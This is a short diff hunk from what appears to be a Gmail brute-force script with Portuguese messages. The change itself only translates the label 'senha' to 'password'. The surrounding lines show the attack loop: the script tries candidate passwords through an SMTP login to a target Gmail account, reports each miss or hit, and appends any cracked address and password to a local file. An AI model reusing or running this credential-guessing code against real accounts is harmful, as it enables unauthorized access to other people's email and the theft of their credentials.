@@ -115,7 +115,7 @@ elif options.gmail !=None or  options.gmail== None or options.gmail==None:
             try :    
                 smtp_srverG.login(options.gmail,password)
                 print("{}<<<+++sua senha foi encontrada com sucesso  :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
-                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tsenha:"+password+"\n")
+                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tpassword:"+password+"\n")
                 break
             except smtplib.SMTPAuthenticationError:
                 print("{}<<<---Senha não encontrada : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
